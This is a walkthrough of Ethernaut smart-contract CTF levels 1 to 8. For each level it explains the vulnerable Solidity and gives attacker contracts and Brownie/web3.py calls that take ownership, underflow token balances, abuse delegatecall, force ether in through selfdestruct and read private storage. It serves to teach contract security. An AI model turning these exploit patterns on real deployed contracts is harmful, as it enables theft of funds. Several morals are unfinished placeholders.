# Ethernaut
## Setting up Environment
I used Brownie for my development environment. All soltuions are implemented as scripts in `/scripts` 
You will need to obtain an archive URL from Alchemy and create a new development network.
```
brownie networks add development rinkeby-fork cmd=ganache-cli host=http://127.0.0.1 fork=**ARCHIVE URL** accounts=10 mnemonic=brownie port=8545
```
### Setting up account
Brownie has an accounts package that lets you add your own account with your respective private key. To do this you can use the following command:
```
brownie accounts new [name]
```
You will then be prompted to add your private key and set a password to encrypt your private key. 
This is how you can load your account in your scripts: (this will prompt you to input your password)
```
account = accounts.load([name])
```
### Running scripts
First I ran my scripts locally to test my solutions. Then I ran my scripts live on Rinkeby to pass the levels.
```
# run scripts locally
brownie run scripts\fallout.py --network rinkeby-fork
# run scripts live on Rinkeby
brownie run scripts\fallout.py --network rinkeby
```
**Note: All attacker contracts can be found in their respective level's `.sol` file. I.e CoinFlipAttacker can be found in CoinFlip.sol**
## Level 1: Fallback
To beat this level we must claim ownership of the contract and then drain it. We need to become the owner and then we can call `withdraw()`, which has a modifier that only allows the current owner to call the function. 
There are two places where the owner variable can be modified:
1. In the contribute function
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
2. In the fallback function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
The contribute function only lets us send less than 0.001 ether at a time and the owner variable gets modified only when our contributions are greater than the contributions of the current owner. The contributions of the current owner have been set to 1000 ether in the constructor:
```solidity
constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```
Therefore, this method is not practical. Now we know that we need to trigger the fallback function in order to set ourselves as the owner.
The require statment in the fallback function checks that our transaction has a value greater than 0 and that our contributions are also greater than 0. We will need to call `contribute()` with an arbitrarily small amount of ether (at least less than 0.001) to satisfy this check.
```python
eth_amount = Web3.toWei("0.00001", "ether")
fallback.contribute({"from": account, "value": eth_amount}) 
```
Once we have called contribute we are now ready to trigger the fallback function. To do this we will execute a simple ether transfer to the contract. We can do this very easily with brownie's built in transfer method for accounts:
```
account.transfer(fallback, "0.00001 ether")
```
We can check that we are now the owner of the contract:
```python
print(fallback.owner() == account.address)
```
All that is left to do is drain the contract. We will do this by calling `withdraw()`. We will pass the check in the `onlyOwner` modifier since we are now the current owner.
```python
fallback.withdraw({"from": account})
```
We have now successfully passed the level! 
This level shows us that anyone is able to call the fallback function of a contract and execute any code that is in said fallback function. Moral of the story: Be wary of putting code that modifiers sensitive state variables in your fallback function. 

## Level 2: Fallout
To pass this level we need to claim ownership of the contract. We can see that the owner variable only gets modified once in the constructor:
```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
We can see that this constructor does not use the `constructor` keyword. Therefore, the name of the constructor function must match the name of the contract in order to be executed as a constructor. 
Note that since `Solidity v0.4.22` this method is now deprecated. Since this contract does not use the `constructor` keyword, the Fal1out function can be seen as any normal function. We can then call this function and become the owner of the contract.
```python
fallout.Fal1out({"from": account})
```
Now we can check that we are the owner of the contract:
```python
print(fallout.owner() == account.address)
```
We have successfully passed this level!
Moral of the story: Use the `constructor` keyword.

## Level 3: Coin Flip
To beat this level we need to call `flip()` with the correct guess 10 times. Every time we call `flip()` with the correct guess, we will increment the `consecutiveWins` state variable. An incorrect guess will set `consecutiveWins` back to 0.
```solidity
if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```
Lets examine the rest of the function. 
The function first takes the blockhash of the previous block number and stores it in a variable of type uint256 called blockValue.
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```
Then it checks if the state variable `lastHash` is equal to `blockValue`, and will revert if it is
```solidity
if (lastHash == blockValue) {
      revert();
    }
```
If the above check does not resolve to True, then `lastHash` will be set to the value of `blockValue`. The next line sets a new variable named `coinFlip` equal to `blockValue` divided by the state variable `FACTOR`.
```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```
```solidity
lastHash = blockValue;
uint256 coinFlip = blockValue.div(FACTOR);
```
This next line may look confusing, but it is just a fancy `if statement`.
This:
```solidity
bool side = coinFlip == 1 ? true : false;
```
Is the same as this:
```solidity
if (coinFlip == 1) {
    return true;
} else {
    return false;
}
```
The return value of this if statement is stored in a variable called side. We already took a look at the last piece of code. If `side` is equal to `guess` then we will successfully increment `consecutiveWins`.
This level tries to create a game that relies on randomness. However, the deterministic nature of blockchains makes it impossible to produce a true random number in smart contracts. This contract uses `blockhash`, `block.number`, and a large number stored in `FACTOR` to compute a random boolean value. We know exactly how this contract computes this "random value" and therefore we can create a custom contract that computes the same value in the same way. 
Our contract: 
```solidity
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public instance;

    constructor(address _instance) public {
        instance = ICoinFlip(_instance);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        instance.flip(side);
    }
}
```
Our contract will have an `attack()` function that will mimic the logic of the CoinFlip contract. `attack()` will compute the same boolean value that the CoinFlip contract computes since both transactions will be in the same block and `block.number - 1` will produce the same value. Once the answer is computed and stored in `side`, we can call `flip()` with `side` as an argument. This will ensure that our guess is in fact the right answer. We will repeat this 10 times:
```python
for i in range(10):
    CoinFlipAttacker.attack({"from": account})
```
We can check to see that we have called `flip()` will the correct guess 10 times:
```python
print(CoinFlip.consecutiveWins() == 10)
```
We have successfully passed the level! Moral of the story: Do not use `blockhash`, `block.number`, or any hardcoded values for random number generation. Note that although we created a custom contract to mimic the use of `blockhash` and `block.number`, those values can also be manipulated by miners. You are better off using oracle services for random number generation, such as `Chainlink VRF`.

## Level 4: Telephone
To beat this level we need to claim ownership of the contract. The owner variable can only be modified in the `changeOwner` function.
```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```
All we need to do is call this function and pass our address as an argument. The catch is the require statement. We will only be able to set the owner to our address if `tx.origin` is not equal to `msg.sender`. How could we make sure this condition is met? To figure this out we need to be aware of the differences between `tx.origin` and `msg.sender`. `msg.sender` refers to the immediate sender of the transaction. `tx.origin` refers to the EOA (externally owned address) that initiated the transaction. This means that `msg.sender` can be either a contract or an EOA. On the other hand, `tx.origin` can only be an EOA. To solve this level we will create a custom contract and use that contract to call the `changeOwner` function. The `msg.sender` of the transaction will be our custom contract and the `tx.origin` will be the account that created our custom contract (our account).
Our contract is very simple:
```solidity
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public instance;

    constructor(address _instance) public {
        instance = ITelephone(_instance);
    }

    function attack(address _owner) external {
        instance.changeOwner(_owner);
    }
}
```
We have a function called `attack()` that will call `changeOwner`. It will satisfy the require statement for reasons mentioned above. Once we call `attack()` with our address as an argument, we will be the new owners of the Telephone contract.
```python
TelephoneAttacker.attack(account.address, {"from": account})
```
Now we can now check that we are the new owner of the contract:
```python
print(Telephone.owner() == account.address)
```
We have successfully passed the level! 
Moral of the story: Understand the differences between `ms.sender` and `tx.origin`. If you use `tx.origin` as an authorization check instead of `msg.sender`, your contract may fall victim to a phising-style attack. Here is a simple example of how this type of attack can occur:

Suppose there is a victim contract
```solidity
contract Victim {
    address payyable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function withdraw() public {
        require(tx.origin == owner);
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
This contract allows the owner to withdraw funds from the contract. However, since the require statement checks the value of owner against `tx.origin`, this function is susceptible to a phising attack.

Consider an attacker contract
```solidity
interface IVictim {
    function withdraw() external;
}
contract attacker {
    IVictim public victim;

    constructor(address _victim) {
        victim = IVictim(_victim);
    }

    fallback() external payable {
        victim.withdraw();
    }
}
```
This contract has a fallback function that will call the withdraw function of the victim contract. Now suppose the attacker got the victim to send ether from their account to the attacker's contract. That transaction will trigger the fallback function in the attacker's contract and that in turn will call the withdraw function. 
```
victim's account - ether - > attacker's contract - withdraw - > victim's contract
```
The withdraw function will look at the `tx.origin` of the transaction, which is the victim's account (owner), and the require statement will pass. Then all the ether in the victim's contract will be sent to `msg.sender`, which in this case is the attacker's contract. 

## Level 5: Token
 To beat this level we need to hack the token contract and steal some extra tokens. This contract only has one function that transfers tokens and that function is aptly called `transfer`. 
 ```solidity
 function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
 ```
 The issue with this function is with the require statement. It verifies that the balance of `msg.sender` will not be less than 0 after subtracted by `value`. This require statement doesn't actually achieve anything. This check will always return true because uint (unsigned integers) can not be negative numbers. So, how can be we exploit this check? We can take advantage of this useless require statement and cause an integer underflow. To illustrate this exploit simply, we will create a custom contract to act as our accomplice.
 ```solidity
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenAttacker {
    IToken public instance;

    constructor(address _instance) public {
        instance = IToken(_instance);
    }

    function attack(address _to, uint256 _value) external {
        instance.transfer(_to, _value);
    }
}
 ``` 
 Our accomplice has an `attack` function that simply calls the `tranfer` function in the Token contract. Why are we using a custom contract to call `transfer`? Having created this contract, it has a value of 0 tokens in the Token contract. We can pass any value greater than 0 to the `attack` function and this will result in the balance of our accomplice (0) being subtracted by that value (e.g 1). This will result in an integer underflow in this line of the Token contract:
 ```solidity
 balances[msg.sender] -= _value;
 ```
 uint256 0 - uint256 1 is equal to the max value for uint256 (2^256 - 1), which is a very big number. Great! We just gave our accomplice a huge amount of tokens. We can now choose to transfer as much of those tokens to our account as we want. We can do this by simply calling `attack` again with our account and desired token amount as agruments.
 ```python
 TokenAttacker.attack(account.address, *BIG NUMBER*)
 ```
However, its worth noting that this step is actually optional. We already solved this challenge when we called `attack` and passed in the value of 1. 
```python
TokenAttack.attack(account.address, 1)
```
Like we saw above, this will result in our accomplice receiving a huge amount of tokens. This will also transfer 1 token to our account, which will make our account's balance 21 tokens. We can take this even further and call the attack function with 1000000 as an agrument. This will pass the require statement and will give us a total balance of 1000020 tokens. You basically have the power to transfer as many tokens to yourself as you'd like. After you transfer your desired amount of tokens, you can check that your balance is now greater than 20:
```python
print(Token.balanceOf(account.address) > 20)
```
You have successfully passed the level! 
Moral of the story: Uints have the potential to overflow or underflow. It is a best practice to use Openzeppelin's SafeMath library to handle your Uint data types. 
**Note that starting from solidity version 0.8.0, integer overflows and underflows revert by default.** 

## Level 6: Delegation
To beat this level we need to claim ownership of our instance. We are given the address of the Delegation contract.
```solidity
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```
This contract is a basic proxy contract, it has a fallback function that delegates calls to a delegate contract. It does this via the low level `delegatecall` function. Delegatecall is similar to call, except it will call a function in the target contract and execute the logic of the target contract's function in the context of the caller. 
```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}
```
In this case the target contract is the Delegate contract, the function is `pwn()`, and the caller is Delegation. Why do we want to call `pwn()`? The pwn() function sets the owner variable in the Delegate contract to msg.sender. This is exactly the type of function we need in our Delegation contract in order for us to become the owner. Delegatecall allows us to use the logic found in the pwn() function in the context of our Delegation contract. By using delegatecall to call `pwn()`, you can imagine that our Delegation contract momentarily looks like this:
```solidity
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function pwn() public {
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }

```
Therefore, calling `pwn()` via Delegation will allow us to set ourselves as the owner. We can do this in a few steps.
1. Calculate the function signature of `pwn()`
2. Craft a transaction to Delegation with the function signature in the data field.
3. Send transaction
We can calculate the function signature with web3.py
```python
sig_bytes = Web3.keccak(text="pwn()")
sig = sig_bytes[:4]
```
We can also use web3.py to build and sign a transaction with our account's private key
```python
private_key = config["wallets"]["from_key"]
nonce = w3.eth.get_transaction_count(account.address)

signed_txn = w3.eth.account.sign_transaction(
    dict(
        nonce=nonce,
        gas=100000,
        gasPrice=20000000000,
        to=delegation.address,
        value=0,
        data=sig,
        chainId=4,
    ),
    private_key,
)
```
Finally, we will send the transaction
```python
tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
```
We can now check that we are the new owner of Delegation.
```python
print(Delegation.owner() == account.address)
```
We have successfully passed the level!
Moral of the story: **add this**

## Level 7: Force
To beat this level we need to make the balance of the contract greater than 0. Before we get into the solution for this level, lets discuss the different ways to send ether to a contract. We can send ether in 2 ways.
1. Direct ether transfer, triggering payable fallback function
2. Directly to a payable function (not fallback)
The trend here is that you need to send ether to a `payable` function within a smart contract. However, there is another way to send ether to a contract. You can use the `selfdestruct` function. This function will destroy the code of its own contract and send the remaining ether to a specified address. The specified address does not need to have a payable fallback function to receive the ether sent through this selfdestruct function. Therefore, we can forcibly send ether to any contract we want. To do this we will create a custom contract, send it some ether, and call selfdestruct with the Force contract address as the argument.
Here is our custom contract:
```solidity
contract ForceAttacker {
    constructor() public payable {
        require(msg.value > 0);
    }

    function sendThemSomeEth(address _contract) external {
        selfdestruct(payable(_contract));
    }
}
```
When we deploy this contract we will also send a small amount of ether (as specified in the constructor).
```python
eth_amount = Web3.toWei("0.0001", "ether")
hacker = ForceAttacker.deploy({"from": account, "value": eth_amount})
```
Now our contract has a balance of 0.0001 ether. Now we will call the 'sendThemSomeEth' function and pass the Force contract's address as an argument.
```python
hacker.sendThemSomeEth(Force.address, {"from": account})
```
Our contract is now destroyed and the Force contract should have recieved all of our 0.0001 ether. We can now check that The Force contract has a balance greater than 0.
```python
print(Force.balance() > 0)
```
We have successfully passed the level!
Moral of the story: **add this**

##  Level 8: Vault
To pass this level we must unlock the Vault contract. In other words we must change the value of the `locked` state variable to false. This is the Vault contract:
```solidiy
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
``` 
There is only function that we can use to change the value of `locked`: the `unlock` function. This function takes in a bytes32 value and compares that value to `password`, which is another state variable in this contract. If we could pass a value to this function that is equal to the value of `password`, we will successfully change the value of `locked` to false. Great, now all we need to do is read the value of `password` and then pass that value into the `unlock` function right? Unfortunately its not that easy. `password` is marked as private. This means that this state variable is only able to be read and modified within the contract that it is defined. However, blockchain data is public and anyone is able to read that data. In this case the `private` keyword is only specifying the visibility within and between smart contracts. We can use web3.py to read this state variable by querying the Ethereum blockchain. 
We do so with the follwing code:
```python
password = w3.eth.get_storage_at(Vault.address, 1)
```
The `get_storage_at` method takes in an address and a storage position (slot) that you want to read from. Here we are passing in the address of our Vault contract and we are saying we want to read from storage slot 1. Why 1? Lets take a look at the storage of the Vault contract.
```solidiy
bool public locked; # storage slot 0
bytes32 private password; # storage slot 1
```
Data is stored contiguously in smart contracts, starting with the state variable that is defined first (storage slot 0). Each storage slot is able to hold 32 bytes and data that are less than 32 bytes can be packed together. For example, the first value defined is a bool equal to True. Converted to Hex this is represented as 0x0000000000000000000000000000000000000000000000000000000000000001 (32 bytes). As you can see there are still a great number of empty bytes in this storage slot. A uint8 can be defined next in the contract and it will also be packed into storage slot 0. However, the next state variable that is defined is of type bytes32 which requires its own storage slot since it specifies a dedicated size of 32 bytes. There are exceptions and further specifications regarding the layout of storage in smart contracts that I did not touch on. I suggest you reading the [Solidity Documentation](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) to get a thorough understanding of the storage layout. For the purpose of this challenge, all we need to understand is that the value of `password` is stored in the next storage slot, which is storage slot 1.
Now that we have the value of `password` stored in a variable, we can call the `unlock` function and pass that variable as an argument.
```python
Vault.unlock(password, {"from": account})
```
We can check that the value of `locked` is now equal to false.
```python
print(Vault.locked == False)
```
We have successfully passed the level!
Moral of the story: **add this**






